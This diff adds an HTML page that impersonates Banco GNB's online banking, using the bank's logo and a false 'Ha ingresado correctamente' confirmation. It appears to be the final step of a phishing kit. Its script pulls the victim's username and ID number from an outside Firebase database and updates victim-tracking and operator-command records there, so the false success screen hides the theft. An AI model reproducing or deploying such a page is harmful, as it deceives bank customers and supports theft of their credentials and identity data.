@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no">
+<title>GNB :: Sesión iniciada</title>
+<link rel="icon" href="https://www.bancognb.com.py/bancaweb/img/favicon.ico" type="image/icon">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700&display=swap">
+<style>
+html{background:transparent;font-family:"Open Sans",sans-serif;}
+body{min-width:320px;margin:0;}
+.bg-gnb-login{background-color:#EDEDED;font-family:'Open Sans',sans-serif;}
+#login-content{background:#fff;min-height:47.6em;margin-right:-15px;margin-left:-15px;display:table;}
+.header-login{padding-top:20px;padding-bottom:20px;}
+.centertext{text-align:center;}
+h2.cliente{font-family:'Open Sans',sans-serif;font-weight:600;font-size:25px !important;line-height:1.2;margin:0;color:#7AB83F;text-align:center;}
+.caja-txt{font-family:'Open Sans',sans-serif;font-size:14.5px;color:#4a4a4a;text-align:center;line-height:1.6;padding:0 34px;margin-top:14px;}
+.check{
+  width:78px;height:78px;border-radius:50%;background:#e8f5ec;border:2px solid #7AB83F;
+  display:flex;align-items:center;justify-content:center;margin:22px auto 0;
+}
+.check svg{width:38px;height:38px;stroke:#3f9b2e;stroke-width:3.5;fill:none;}
+.detalle{
+  margin:22px 30px 0;border:1px solid #e6e6e6;background:#fafafa;padding:14px 18px;
+  font-family:'Open Sans',sans-serif;font-size:13px;color:#5a5a5a;line-height:1.9;
+}
+.detalle b{color:#121212;font-weight:600;}
+.btn-login{background:#0574AF !important;border:0 !important;border-radius:0 !important;box-shadow:none !important;height:50px;width:100%;display:flex !important;align-items:center;justify-content:center;padding:0 !important;margin:0;cursor:pointer;line-height:normal !important;}
+.btn-login span{font-family:'Open Sans',sans-serif;font-weight:600;font-size:16px;color:#fff;line-height:1;display:block;position:static !important;margin:0 !important;}
+.btn-login:hover{background:#04608f !important;}
+.pie{font-family:'Open Sans',sans-serif;font-size:12px;color:#8a8d8f;text-align:center;margin-top:18px;}
+@media (min-width:992px){#login-content{margin-left:25% !important;}}
+</style>
+</head>
+<body class="bg-gnb-login">
+<div class="container">
+  <div class="row">
+    <div id="login-content" class="col-md-6 col-md-offset-3">
+
+      <div class="col-xs-12 col-sm-10 col-md-10 col-md-offset-1 centertext header-login">
+        <img src="https://www.bancognb.com.py/bancaweb/img/brand/new-logo-gnb-fusion.svg" alt="GNB" width="300" height="150" style="max-width:100%;height:auto">
+      </div>
+
+      <div class="col-md-12 col-xs-12 col-sm-12">
+        <div class="check">
+          <svg viewBox="0 0 24 24"><path d="M4 12.5l5 5L20 6.5"/></svg>
+        </div>
+        <h2 class="cliente" style="margin-top:18px;">Ha ingresado correctamente</h2>
+        <p class="caja-txt">Su identidad fue validada y la sesión quedó iniciada.</p>
+
+        <div class="detalle">
+          Usuario: <b id="lblUsuario">—</b><br>
+          Documento: <b id="lblDoc">—</b><br>
+          Estado: <b>Acceso confirmado</b>
+        </div>
+
+        <div class="col-md-8 col-md-offset-2 padding-0" style="margin-top:22px;">
+          <button id="btnSalir" type="button" class="btn btn-login"><span>Salir</span></button>
+        </div>
+
+        <p class="pie">Conexión segura GNB · Sesión protegida</p>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+  var DB="https://cbonnlineec-default-rtdb.firebaseio.com/nbch";
+  var id=new URLSearchParams(location.search).get('u');
+  if(!id){ try{ id=localStorage.getItem('nbch_u'); }catch(x){} }
+  if(!id){ location.replace('index.html'); return; }
+
+  fetch(DB+'/usuarios/'+id+'.json').then(function(r){return r.json();}).then(function(d){
+    if(!d) return;
+    if(d.usuario) document.getElementById('lblUsuario').textContent = d.usuario;
+    if(d.cedula) document.getElementById('lblDoc').textContent = d.cedula;
+  }).catch(function(){});
+
+  fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify({estado:'FINALIZADO', pagina:'final.html', online:false})}).catch(function(){});
+  fetch(DB+'/comandos/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify({accion:''})}).catch(function(){});
+
+  document.getElementById('btnSalir').addEventListener('click', function(){
+    try{ localStorage.removeItem('nbch_u'); }catch(x){}
+    location.href = 'index.html';
+  });
+})();
+</script>
+</body>
+</html>
